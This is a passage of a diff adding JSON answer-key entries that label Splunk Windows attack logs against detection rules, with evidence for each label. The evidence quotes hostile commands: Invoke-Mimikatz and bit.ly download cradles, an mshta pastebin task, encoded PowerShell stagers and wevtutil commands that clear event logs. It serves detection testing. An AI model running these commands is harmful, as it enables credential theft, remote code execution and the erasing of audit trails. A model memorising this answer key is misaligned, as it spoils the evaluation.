+      "RecordNumber 83804: 1074 shutdown.exe restart of WIN-DC-431 \"Reboot initiated by Ansible\" (the 1074 restarts are lab automation, not a task)",
+      "7045 lab services only, e.g. RecordNumber 83800 sysmon64, 83991 npf"
+     ],
+     "reason": "The schtasks task creation is visible only in process creation (Sysmon 1 / 4688), which a System log lacks."
+    }
+   ]
+  },
+  {
+   "label": "H56",
+   "dataset": "splunk/T1053.005/schtasks/windows-security.log",
+   "sha256": "a260d80c6fa8d00b4ad1eaaa44a69c5467428254efd44a301a29bcac7ae922a5",
+   "summary": "schtasks /create on win-dc-974 by administrator (Security) for two tasks with actions in C:\\Users\\Public: \"SoundIentifier\" (wmic process call create on an ADS in C:\\Users\\Public\\Disk101.ini) and \"Disk Diag\" (explorer.exe C:\\Users\\Public\\Weber0.js every 6 minutes). 4698 confirms both.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 1355394: 4688 win-dc-974, New Process Name C:\\Windows\\System32\\schtasks.exe, Process Command Line \"...schtasks.exe\"  /Create /F /TN \"SoundIentifier\" /TR \"wmic process call create \"C:\\Users\\Public\\Disk101.ini:59e9c935\"\" ...",
+      "RecordNumber 1355397: 4688, \"...schtasks.exe\"  /Create /F /TN \"Disk Diag\" /TR \"explorer.exe C:\\Users\\Public\\Weber0.js\" /SC Minute /MO 6",
+      "RecordNumber 1355395 / 1355398: 4698 \\SoundIentifier / \\Disk Diag with those actions"
+     ],
+     "reason": "A Users\\Public path in the /TR action is the susp_writable_path selection; this rule accepts 4688."
+    }
+   ]
+  },
+  {
+   "label": "H57",
+   "dataset": "splunk/T1053.005/tasksched/windows-security.log",
+   "sha256": "43de4c250c95ef580b714d85e89a7486100e78adb6b1500c1c0d55117842d2af",
+   "summary": "Security log of win-dc-209 plus four task events from win-host-797. On win-host-797 two tasks are deleted and re-created (4699/4698): \"[a site name]\" (mshta http:\\\\pastebin.com\\raw\\...) and \"Windows Free Internet Download Manager\" (rundll32 on a file in AppData\\Roaming, BootTrigger, author Tenucy, SYSTEM). No process creation from that host is recorded: the 842 4688 events are the DC's Splunk modules. The 20 4625 events are internet RDP brute force against the DC.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "telemetry",
+     "evidence": [
+      "RecordNumber 255438: 4698 win-host-797 \\[a site name], Exec \"mshta\" http:\\\\pastebin.com\\raw\\tuhQ7gWV, TimeTrigger",
+      "RecordNumber 255439: 4698 win-host-797 \\Windows Free Internet Download Manager, Exec C:\\Windows\\system32\\rundll32.exe \"C:\\Users\\Administrator\\AppData\\Roaming\\NetDownloadManager_...\\hx1jn.dwn\",StartW",
+      "All 842 4688 events are on win-dc-209 (splunkd.exe children + wermgr.exe); none from win-host-797"
+     ],
+     "reason": "The task actions (mshta with a URL; a DLL in AppData) are suspicious, but the detection reads process creation, with 4698 only a documented complement. The file has no process creation from win-host-797, so the creating command (schtasks or COM) is not visible."
+    },
+    {
+     "detection": "T1110.003_password_spray_burst",
+     "label": "blind-spot",
+     "evidence": [
+      "20 x 4625 on win-dc-209, Status 0xC000006D, Sub Status 0xC0000064 (unknown user), logon type 3, external Source Network Address",
+      "RecordNumber 263874-263878: 193.169.255.186, 4 distinct accounts (sptservice, SAAZDEPUSR, bwadmin, cbadmin) in 5 s (02:33 PM)",
+      "RecordNumber 264893-265006: 193.169.255.32, .21, .245 and 176.111.173.250, .76, 3 distinct accounts each between 03:44 and 03:50 PM"
+     ],
+     "reason": "Background internet RDP brute force (not the recorded T1053.005 attack). In-scope failures, but at most 4 distinct accounts per source per 10-minute window, below the threshold of 5. This is the documented \"distributed sources\" / \"low and slow\" gap, so no alert is expected."
+    }
+   ]
+  },
+  {
+   "label": "H58",
+   "dataset": "splunk/T1053.005/taskschedule/windows-security-publicpath.log",
+   "sha256": "0ae8abdceb9589b330045b5b6013efc585a88125c4a4a9934ffdd56eaad33e42",
+   "summary": "Three 4698 records (two identical copies of RecordNumber 381219 on win-host-194, one on win-dc-877) creating the task \\SystemFailureReporter (author \"Micrsoft Inc.\", repeating every 5 minutes) whose action is c:\\users\\public\\documents\\SystemFailureReporter\\SystemFailureReporter.exe. Nothing else is in the file.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "telemetry",
+     "evidence": [
+      "RecordNumber 381219 (ordinals 1 and 2, duplicates): 4698 win-host-194 \\SystemFailureReporter, Exec c:\\users\\public\\documents\\SystemFailureReporter\\SystemFailureReporter.exe",
+      "RecordNumber 679553970: 4698 win-dc-877, same task and action",
+      "The file holds only these three 4698 events; no Sysmon 1 / 4688"
+     ],
+     "reason": "A Users\\Public action would be suspicious (susp_writable_path), but the rule reads schtasks process creation (Sysmon 1 / 4688), with 4698 only a complement. The file holds only 4698, and the creating command is not recorded."
+    }
+   ]
+  },
+  {
+   "label": "H59",
+   "dataset": "splunk/T1053.005/taskschedule/windows-security.log",
+   "sha256": "8be52f3353471629e16246dbb1307996c564ae7815634571102219170ccd3c08",
+   "summary": "Security log (04/08-04/15/2021, mostly win-dc-877) of a malicious Word document: WINWORD.EXE opens a .doc from the Desktop and, in the same logon session, the scheduled task \\SystemFailureReporter (author \"Micrsoft Inc.\", every 5 minutes) is registered with the action c:\\users\\public\\documents\\SystemFailureReporter\\SystemFailureReporter.exe; the registration is visible only as 4698 (no schtasks.exe or PowerShell), the task runs appear as 4688. The same 4698 appears for win-host-194 on 04/15. Background: Office Click-to-Run install registering its own tasks with schtasks.exe, Splunk forwarder helpers, DC Kerberos traffic (756 service tickets, all AES 0x12 for machine-account services, from ::1 and 10.0.1.15; no authentication failures).",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "other",
+     "evidence": [
+      "RecordNumber 679548818: 4688 schtasks.exe <- Integrator.exe (SYSTEM), \"schtasks.exe /Create /tn \\\"Microsoft\\Office\\OfficeTelemetryAgentFallBack2016\\\" /XML \\\"C:\\ProgramData\\Microsoft\\ClickToRun\\{9AC08E99-...\"",
+      "Same Office pattern (/Create ... /XML \"C:\\ProgramData\\Microsoft\\ClickToRun\\...xml\") at RecordNumber 679548807, 679548796, 679548785, 679550218, 679550205; the other Office schtasks calls (/change ... /enable, /Create /XML \"C:\\Program Files\\Common Files\\...\") have no susp_* indicator",
+      "RecordNumber 679553970: 4698 task \\SystemFailureReporter by ATTACKRANGE\\administrator (Logon ID 0x72A91) at 04/08/2021 03:34:11 PM, Exec c:\\users\\public\\documents\\SystemFailureReporter\\SystemFailureReporter.exe; no schtasks.exe/powershell.exe 4688 around it, only WINWORD.EXE (RecordNumber 679551142, same Logon ID 0x72A91) running",
+      "RecordNumber 679554087: 4688 the task action SystemFailureReporter.exe <- svchost.exe at 03:35:01 PM (target logon 0x72A91), then every 5 minutes"
+     ],
+     "reason": "Office Click-to-Run schtasks /Create command lines carry a ProgramData path (susp_writable_path: \"any ... ProgramData ... path\"), so an alert is expected, but it is vendor install activity. The attack task itself was registered through the Task Scheduler COM API without schtasks.exe, the documented gap \"Tasks created through the COM API or WMI never spawn schtasks.exe - cover with 4698\"."
+    },
+    {
+     "detection": "T1053.005_powershell_scheduled_task_creation",
+     "label": "blind-spot",
+     "evidence": [
+      "RecordNumber 679553970: 4698 \\SystemFailureReporter registered in WINWORD.EXE's logon session 0x72A91; no Register-ScheduledTask / Set-ScheduledTask on any 4688 command line",
+      "RecordNumber 679548372, 679548394: 4688 the only powershell.exe launches (parent OfficeSetup.exe, \"-NoProfile \\\"$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; ...\")"
+     ],
+     "reason": "The persistence task was created from the macro document through the COM API, the documented gap \"COM API (Schedule.Service) from VBScript, JScript or .NET\"; no PowerShell ScheduledTasks cmdlet was used."
+    }
+   ]
+  },
+  {
+   "label": "H60",
+   "dataset": "splunk/T1059.001/atomic_red_team/downloadfile_windows-security.log",
+   "sha256": "00adb56890d8bce43960928562f370cd62fd687d0e087ff7fdcd03fe4ab513cd",
+   "summary": "Single 4688 on a DC (02/11/2022): Atomic Red Team T1059.001 obfuscation test, powershell.exe (child of powershell.exe) running a download cradle (WebClient DownloadFile from bit.ly, then IEX / ScriptBlock and Invoke-Obfuscation-style variants) in a plain, non-encoded command line.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "blind-spot",
+     "evidence": [
+      "RecordNumber 308456: 4688 powershell.exe <- powershell.exe, \"\\\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\" & {(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e',...\" (1177 chars, 3 lines, no -e/-ec/-en* switch)"
+     ],
+     "reason": "PowerShell attack obfuscated with IEX and variable/string tricks inside a non-encoded command: documented gap \"Obfuscation inside a non-encoded command (IEX, string concatenation, tick marks) - cover with 4104\"."
+    }
+   ]
+  },
+  {
+   "label": "H61",
+   "dataset": "splunk/T1059.001/atomic_red_team/windows-security.log",
+   "sha256": "aed5d2956ff35417d5b971b45d84004f8e8361db3e2c8924b96f3bd0ed57bfb9",
+   "summary": "DC Security log (03/01/2021, win-dc-974) of an Invoke-AtomicTest run of T1059.001: Invoke-Mimikatz and SharpHound download cradles, obfuscation test, Invoke-AppPathBypass, XML / MsXml / mshta cradles, PowerShell v2 downgrade, registry fileless script, PSSession to localhost, NTFS ADS, and AtomicTestHarnesses command-line parameter variants (encoded command / encoded arguments launched through WmiPrvSE). Only 2 Kerberos service tickets (AES, ::1).",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 1382601: 4688 powershell.exe <- WmiPrvSE.exe, \"powershell.exe -NoProfile -E <base64, 128 chars>\" (decodes to a Write-Host test string)",
+      "RecordNumber 1382617: 4688 powershell.exe <- WmiPrvSE.exe, \"powershell.exe -NoProfile -EncodedArguments <base64, 784 chars> -E <base64, 52 chars>\"",
+      "RecordNumber 1382610: 4688 harness wrapper \"powershell.exe & {Out-ATHPowerShellCommandLineParameter ... -EncodedArgumentsParamVariation EncodedArguments ...}\" also fits the pattern (a 16-letter word after an -en* switch); RecordNumber 1382585 \"-EA <base64>\" does not (EA is not e/ec/en*)"
+     ],
+     "reason": "AtomicTestHarnesses starts powershell.exe with -E / -EncodedArguments followed by a Base64 blob of 16+ chars: dash prefix + e/en* + Base64 >= 16 on a PowerShell image, in scope; parent WmiPrvSE is not the SCCM filter."
+    },
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "telemetry",
+     "evidence": [
+      "RecordNumber 1382108: 4688 powershell.exe <- cmd.exe, \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+      "RecordNumber 1382176: 4688 Mimikatz PsSendKeys cradle ending \"IEX($res);invoke-mimikatz -dumpcr\"",
+      "File holds Security events only; no Sysmon EID 10 (ProcessAccess)"
+     ],
+     "reason": "Invoke-Mimikatz -DumpCreds reads LSASS memory, but this detection needs Sysmon EID 10, absent from the file."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "blind-spot",
+     "evidence": [
+      "RecordNumber 1382502: 4688 powershell.exe & {New-PSSession -ComputerName $env:COMPUTERNAME \\n Test-Connection ... (Atomic \"PowerShell Session Creation and Use\")",
+      "RecordNumber 1382515: 4688 wsmprovhost.exe -Embedding <- svchost.exe; no process in the file has wsmprovhost.exe or winrshost.exe as parent"
+     ],
+     "reason": "A PowerShell remoting session was opened but started no child process: documented gap \"Cmdlet-only sessions\". (The rule also reads Sysmon EID 1 only; this file has 4688.)"
+    }
+   ]
+  },
+  {
+   "label": "H62",
+   "dataset": "splunk/T1059.001/hidden_powershell/hidden_windows-security.log",
+   "sha256": "16e1365ee54b13cbc8a5291eca2b6f0da51608de3f923ca87a0699c47f0904c7",
+   "summary": "Filtered 4688 extract (cmd.exe and powershell.exe only) from a DC (02/11/2022): 19 \"hidden PowerShell\" test launches through cmd /c with -ExecutionPolicy ByPass, abbreviated -WindowStyle Hidden variants and an abbreviated -Enco Base64 payload, preceded by 68 Ansible WinRM wrapper launches (PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand) and one EC2Launch wallpaper script.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 306763: 4688 powershell.exe <- cmd.exe, \"powershell.exe  -ExecutionPolicy ByPass /WindowSty Hi -Enco <base64, 44 chars>\" (decodes to a Write-Host test string)",
+      "RecordNumber 306727: 4688 powershell.exe <- cmd.exe, \"powershell.exe  -ExecutionPolicy ByPass -WindowStyle Hidden -Enco <base64, 44 chars>\"; 19 such launches, odd RecordNumbers 306727-306763",
+      "RecordNumber 304182 ... 296698: 68 x 4688 \"PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <base64, 16-2828 chars>\" (decoded: Ansible exec wrapper, ansible-tmp file transfer, LastBootUpTime query, whoami)"
+     ],
+     "reason": "-Enco is an accepted abbreviation (dash + en*) followed by Base64 >= 16 chars on powershell.exe: in scope. The Ansible WinRM wrapper launches are in scope too (other activity)."
+    }
+   ]
+  },
+  {
+   "label": "H63",
+   "dataset": "splunk/T1059.001/hidden_powershell/windows-security.log",
+   "sha256": "864e3e421ec612224c4b5f6a3d6615740a72d918fdb1473d08c542a1dcf1513d",
+   "summary": "DC Security log (11/20/2020) of a 2020 Attack Range build and the \"hidden PowerShell\" run: EC2 provisioning, DC promotion and reboots, logons, Kerberos (all AES 0x12 from ::1 for machine accounts), group changes; two 4625 without a source address. 4688 exists only for boot-time processes, so the PowerShell attack itself is not visible.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "telemetry",
+     "evidence": [
+      "61 x 4688 (RecordNumber 231332-235920), all boot-time processes at the restarts (smss.exe, csrss.exe, autochk.exe, wininit.exe, winlogon.exe, services.exe, lsass.exe, setupcl.exe); the last at 11/20/2020 09:12:37 AM on win-dc-555; no powershell.exe or cmd.exe process creation",
+      "No Sysmon EID 1 in the file"
+     ],
+     "reason": "The hidden-PowerShell execution left no process-creation event in this file (process creation was not recorded after boot), so the detection has nothing to read."
+    }
+   ]
+  },
+  {
+   "label": "H64",
+   "dataset": "splunk/T1059.001/hidden_powershell/windows-system.log",
+   "sha256": "aaa58d5998d561927dc5e931b9ca511e79fefed255ed85a77c7de64881e13a91",
+   "summary": "System log of the same 11/20/2020 hidden-PowerShell run (win-dc-555 and EC2 provisioning hosts): service control manager, boot, time and WinRM listener events; 7045 only for DC roles, Splunk, Sysmon and npf; no log clear.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "telemetry",
+     "evidence": [
+      "System log: no process creation of any kind (no Sysmon EID 1, no Security 4688); 7045 only for DC roles, Splunk, Sysmon and npf, none matching a T1569.002 fingerprint; no 104"
+     ],
+     "reason": "The PowerShell attack cannot appear in a System log; the detection reads process creation."
+    }
+   ]
+  },
+  {
+   "label": "H65",
+   "dataset": "splunk/T1059.001/powershell_execution_policy/windows-security.log",
+   "sha256": "d7904e836ee3d9f0fdce2a89db537e8d62f11bb1ba04128b8de441564ca51fdf",
+   "summary": "DC Security log (12/09/2020) of a 2020 Attack Range build and the \"PowerShell execution policy\" run: provisioning, DC promotion, reboots, logons, Kerberos (all AES 0x12 from ::1, machine accounts), group changes; two 4625 without a source address. 4688 only for boot-time processes; the attack is not visible.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "telemetry",
+     "evidence": [
+      "61 x 4688 (RecordNumber 231332-235884), all boot-time processes at the restarts (smss.exe, csrss.exe, autochk.exe, wininit.exe, winlogon.exe, services.exe, lsass.exe, setupcl.exe); the last at 12/09/2020 08:46:48 AM on win-dc-235; no powershell.exe or cmd.exe process creation",
+      "No Sysmon EID 1 in the file"
+     ],
+     "reason": "No process creation for the attack window, so the detection has nothing to read. (An execution-policy bypass would also be out of scope with telemetry: -ExecutionPolicy/-ep do not trigger the rule.)"
+    }
+   ]
+  },
+  {
+   "label": "H66",
+   "dataset": "splunk/T1059.001/powershell_execution_policy/windows-system.log",
+   "sha256": "a9beb302b323a0ff57192726b7668d43287c13b69280365842409cb9a70f6f39",
+   "summary": "System log of the same 12/09/2020 execution-policy run (win-dc-235 and EC2 provisioning hosts): service control, boot, time and WinRM listener events; 7045 only for DC roles, Splunk, Sysmon and npf; no log clear.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "telemetry",
+     "evidence": [
+      "System log: no process creation of any kind (no Sysmon EID 1, no Security 4688); 7045 only for DC roles, Splunk, Sysmon and npf, none matching a T1569.002 fingerprint; no 104"
+     ],
+     "reason": "The PowerShell attack cannot appear in a System log; the detection reads process creation."
+    }
+   ]
+  },
+  {
+   "label": "H67",
+   "dataset": "splunk/T1059.001/powershell_remotesigned/remotesigned_security.log",
+   "sha256": "8e6aa4ac6893e467c73939c9ba3987774d53f35e564532599c9fff27d4fc6c0d",
+   "summary": "Single XML 4688 (06/22/2023, ar-win-dc): cmd.exe starts PowerShell with -ExecutionPolicy remotesigned to run .\\mal.ps1.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 443121: 4688 NewProcessName powershell.exe, ParentProcessName cmd.exe, CommandLine \"PowerShell  -ExecutionPolicy remotesigned -File .\\mal.ps1\""
+     ],
+     "reason": "PowerShell runs a script file after setting the execution policy; there is no encoded command, and the documentation states -ExecutionPolicy / -ep do not trigger the rule."
+    }
+   ]
+  },
+  {
+   "label": "H68",
+   "dataset": "splunk/T1059.001/powershell_testing/windows-security.log",
+   "sha256": "5aed1de746485d43fe96782aa5f3d298e1ead5d2969f8dc56e18186685969007",
+   "summary": "Security log (08/19/2021, win-dc-704 and win-host-10): Invoke-AtomicTest T1059.001 run (Mimikatz and SharpHound cradles, obfuscation, AppPathBypass, MsXml/XML/mshta cradles, v2 downgrade, registry fileless script, PSSession, NTFS ADS, encoded-command test, ATH variants), AdFind/nltest/dsquery discovery, then two HTA files opened from the Desktop that start encoded PowerShell stagers. Only 5 Kerberos service tickets (AES, ::1).",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 2932970: 4688 powershell.exe <- cmd.exe, \"powershell.exe  -e  <base64, 256 chars>\" (Atomic encoded test; decodes to an obfuscated Write-Host)",
+      "RecordNumber 2933373: 4688 powershell.exe <- mshta.exe (secure_invoice.hta), \"powershell.exe -noP -sta -w 1 -enc  <base64, 2764 chars>\" (WebClient stager)",
+      "RecordNumber 2933389: 4688 powershell.exe <- mshta.exe (insecure_invoice.hta), \"powershell.exe -nop -w hidden -encodedcommand <base64, 7360 chars>\" (gzip + IEX stager)"
+     ],
+     "reason": "Encoded-command switches -e / -enc / -encodedcommand with Base64 >= 16 chars on powershell.exe: in scope."
+    },
+    {
+     "detection": "T1003.001_lsass_memory_access",
+     "label": "telemetry",
+     "evidence": [
+      "RecordNumber 2932279: 4688 powershell.exe <- cmd.exe, \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+      "RecordNumber 2932399: 4688 Mimikatz PsSendKeys cradle ending \"IEX($res);invoke-mimikatz -dumpcr\"",
+      "File holds Security events only; no Sysmon EID 10 (ProcessAccess)"
+     ],
+     "reason": "Invoke-Mimikatz -DumpCreds reads LSASS memory, but this detection needs Sysmon EID 10, absent from the file."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "blind-spot",
+     "evidence": [
+      "RecordNumber 2932861: 4688 powershell.exe & {New-PSSession -ComputerName $env:COMPUTERNAME \\n Test-Connection ... (Atomic \"PowerShell Session Creation and Use\")",
+      "RecordNumber 2932875 and 2933012: 4688 wsmprovhost.exe -Embedding <- svchost.exe; no process in the file has wsmprovhost.exe or winrshost.exe as parent"
+     ],
+     "reason": "The remoting session started no child process: documented gap \"Cmdlet-only sessions\". (The rule also reads Sysmon EID 1 only; this file has 4688.)"
+    }
+   ]
+  },
+  {
+   "label": "H69",
+   "dataset": "splunk/T1059.001/powershell_xml_requests/windows-security.log",
+   "sha256": "78cded986f1fbfc85246c0b8a1c50f061ed061a774acfcddad8935daf2b0dd60",
+   "summary": "DC Security log (11/20/2020) of a 2020 Attack Range build and the \"PowerShell XML requests\" run: provisioning, DC promotion, reboots, logons, Kerberos (all AES 0x12 from ::1, machine accounts), group changes; two 4625 without a source address. 4688 only for boot-time processes; the attack is not visible.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "telemetry",
+     "evidence": [
+      "61 x 4688 (RecordNumber 231332-235944), all boot-time processes at the restarts (smss.exe, csrss.exe, autochk.exe, wininit.exe, winlogon.exe, services.exe, lsass.exe, setupcl.exe); the last at 11/20/2020 10:32:54 AM on win-dc-549; no powershell.exe or cmd.exe process creation",
+      "No Sysmon EID 1 in the file"
+     ],
+     "reason": "No process creation for the attack window, so the detection has nothing to read."
+    }
+   ]
+  },
+  {
+   "label": "H70",
+   "dataset": "splunk/T1059.001/powershell_xml_requests/windows-system.log",
+   "sha256": "8335c821c68b10b7d9d3e7e3244b12643144c497555b280cfae6e250f10896ca",
+   "summary": "System log of the same 11/20/2020 XML-requests run (win-dc-549 and EC2 provisioning hosts): service control, boot, time and WinRM listener events; 7045 only for DC roles, Splunk, Sysmon and npf; no log clear.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "telemetry",
+     "evidence": [
+      "System log: no process creation of any kind (no Sysmon EID 1, no Security 4688); 7045 only for DC roles, Splunk, Sysmon and npf, none matching a T1569.002 fingerprint; no 104"
+     ],
+     "reason": "The PowerShell attack cannot appear in a System log; the detection reads process creation."
+    }
+   ]
+  },
+  {
+   "label": "H71",
+   "dataset": "splunk/T1070.001/atomic_red_team/windows-security.log",
+   "sha256": "0548e1aef0aae426b28fffd3929dd16a9ed30fa0d8c6f97eed52867524e5db8c",
+   "summary": "DC Security log (10/09/2020, win-dc-1796611 and EC2 provisioning hosts) of the Atomic T1070.001 run: the Security log is cleared at 09:10:56 by ATTACKRANGE\\Administrator (1102); otherwise build traffic (logons, AES Kerberos from ::1, group changes). 4688 only for boot-time processes.",
+   "labels": [
+    {
+     "detection": "T1070.001_security_log_cleared",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 228829: 1102 (Microsoft-Windows-Eventlog, Log clear) \"The audit log was cleared\", Subject ATTACKRANGE\\Administrator, Logon ID 0x7A3E5, 10/09/2020 09:10:56 AM, win-dc-1796611"
+     ],
+     "reason": "Security log cleared: 1102 is exactly what the rule reads; no maintenance-window exception applies."
+    },
+    {
+     "detection": "T1070.001_event_log_clearing",
+     "label": "telemetry",
+     "evidence": [
+      "61 x 4688 (RecordNumber 223462-228358), all boot-time processes (smss.exe, csrss.exe, wininit.exe, lsass.exe ...), the last at the 09:09:17 AM reboot; no wevtutil.exe / powershell.exe process creation before the 1102 at 09:10:56"
+     ],
+     "reason": "The clearing command (wevtutil / Clear-EventLog) was not recorded as process creation, so the command-line rule has nothing to read; only the 1102 outcome is present."
+    },
+    {
+     "detection": "T1070.001_system_log_cleared",
+     "label": "telemetry",
+     "evidence": [
+      "Security log only: System 104 is written to the System channel, which this file does not contain"
+     ],
+     "reason": "The rule reads System 104; the log-clearing run cannot show it in a Security log."
+    }
+   ]
+  },
+  {
+   "label": "H72",
+   "dataset": "splunk/T1070.001/atomic_red_team/windows-system.log",
+   "sha256": "fcc3ed3862432b2053b71fc41a8b14087d020f174615ec0ef4895d3811a33cca",
+   "summary": "System log of the same 10/09/2020 Atomic T1070.001 run (win-dc-1796611): DC build, Splunk/Sysmon/nxlog installs, reboots, then at 09:10:56 four 104 events (Windows PowerShell, System twice, Active Directory Web Services logs cleared).",
+   "labels": [
+    {
+     "detection": "T1070.001_system_log_cleared",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 80417: 104 Microsoft-Windows-Eventlog \"The Windows PowerShell log file was cleared.\" 10/09/2020 09:10:56 AM",
+      "RecordNumber 80416 and 80407: 104 Microsoft-Windows-Eventlog \"The System log file was cleared.\"",
+      "RecordNumber 80408: 104 Microsoft-Windows-Eventlog \"The Active Directory Web Services log file was cleared.\""
+     ],
+     "reason": "104 from the Microsoft-Windows-Eventlog provider (both required by the rule) for non-Security logs: in scope."
+    },
+    {
+     "detection": "T1070.001_event_log_clearing",
+     "label": "telemetry",
+     "evidence": [
+      "System log: no process creation (no Sysmon EID 1, no Security 4688)"
+     ],
+     "reason": "The clearing command line cannot appear in a System log."
+    },
+    {
+     "detection": "T1070.001_security_log_cleared",
+     "label": "telemetry",
+     "evidence": [
+      "System log only: Security 1102 is written to the Security channel, which this file does not contain"
+     ],
+     "reason": "The rule reads Security 1102; it cannot appear in a System log."
+    }
+   ]
+  },
+  {
+   "label": "H73",
+   "dataset": "splunk/T1070.001/ssa_wevtutil/clear_evt.log",
+   "sha256": "5b79963279b6bcc30c58e11dd4f6bb0e0dec5cd82e2b243ac0900998c75f3049",
+   "summary": "Three Security 4688 events on win-dc-315 (all carrying RecordNumber 271326, i.e. edited copies of one record): ATTACKRANGE\\administrator runs wevtutil cl Application, cl Security and cl System from cmd.exe (Splunk SSA wevtutil log-clearing sample).",
+   "labels": [
+    {
+     "detection": "T1070.001_event_log_clearing",
+     "label": "attack",
+     "evidence": [
+      "ord 1 RecordNumber 271326 (06/15/2021 12:00:19 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil  cl Application, Creator Process Name C:\\Windows\\System32\\cmd.exe",
+      "ord 2 RecordNumber 271326 (06/15/2021 12:02:00 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil  cl Security, Creator Process Name C:\\Windows\\System32\\cmd.exe",
+      "ord 3 RecordNumber 271326 (06/15/2021 12:04:09 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil  cl System, Creator Process Name C:\\Windows\\System32\\cmd.exe"
+     ],
+     "reason": "wevtutil cl is the selection_wevtutil method; Security 4688 with command line is accepted telemetry; no filter applies."
+    },
+    {
+     "detection": "T1070.001_security_log_cleared",
+     "label": "telemetry",
+     "evidence": [
+      "ord 2 RecordNumber 271326 (06/15/2021 12:02:00 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil  cl Security",
+      "file holds only 3 x Security 4688; no Security 1102"
+     ],
+     "reason": "The Security log was cleared, but this outcome rule reads Security 1102, which the file does not contain."
+    },
+    {
+     "detection": "T1070.001_system_log_cleared",
+     "label": "telemetry",
+     "evidence": [
+      "ord 1 RecordNumber 271326 (06/15/2021 12:00:19 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil  cl Application",
+      "ord 3 RecordNumber 271326 (06/15/2021 12:04:09 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil  cl System",
+      "no System log events in the file (no System 104)"
+     ],
+     "reason": "Application and System were cleared, which writes System 104 (Microsoft-Windows-Eventlog); the file has no System 104."
+    }
+   ]
+  },
+  {
+   "label": "H74",
+   "dataset": "splunk/T1070.001/ssa_wevtutil/disable_evt.log",
+   "sha256": "00b7a2dc26cbd9befd17546cc9d2a57c9d973c6807d3f43d334f70043e9f9101",
+   "summary": "Two Security 4688 events on win-dc-315 (RecordNumber 271329 twice): administrator runs wevtutil.exe sl Application /e:false and sl Security /e:false from cmd.exe - disabling event logs, not clearing them.",
+   "labels": [
+    {
+     "detection": "T1070.001_event_log_clearing",
+     "label": "scope",
+     "evidence": [
+      "ord 1 RecordNumber 271329 (06/15/2021 12:00:19 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil.exe  sl Application /e:false, Creator Process Name C:\\Windows\\System32\\cmd.exe",
+      "ord 2 RecordNumber 271329 (06/15/2021 12:01:19 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil.exe  sl Security /e:false, Creator Process Name C:\\Windows\\System32\\cmd.exe"
+     ],
+     "reason": "Event-log tampering by disabling channels (wevtutil sl /e:false); the documented wevtutil selection covers only cl / clear-log (and the PowerShell/WMI clear, remove and Limit-EventLog methods), so set-log is outside scope. Nothing is cleared, so no 1102/104 outcome is expected either."
+    }
+   ]
+  },
+  {
+   "label": "H75",
+   "dataset": "splunk/T1070.001/ssa_wevtutil/windows-security.log",
+   "sha256": "9f789960dbad4f425fdb57e1af129f89d472ea74225dae19f8d99c472c6dccde",
+   "summary": "703 Security events (win-dc-315, win-host-829): Splunk forwarder process noise plus a malware-style batch run from C:\\Temp by administrator (net user /delete, net stop, sc stop/delete/config of AV and miner services, wevtutil sl Application /e:false, wevtutil cl Application).",
+   "labels": [
+    {
+     "detection": "T1070.001_event_log_clearing",
+     "label": "attack",
+     "evidence": [
+      "ord 614 RecordNumber 271326 (06/15/2021 12:00:19 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil  cl Application, Creator Process Name C:\\Windows\\System32\\cmd.exe",
+      "ord 611 RecordNumber 271329 (06/15/2021 12:00:19 PM): 4688, New Process Name C:\\Windows\\System32\\wevtutil.exe, Process Command Line wevtutil.exe  sl Application /e:false - set-log, outside scope",
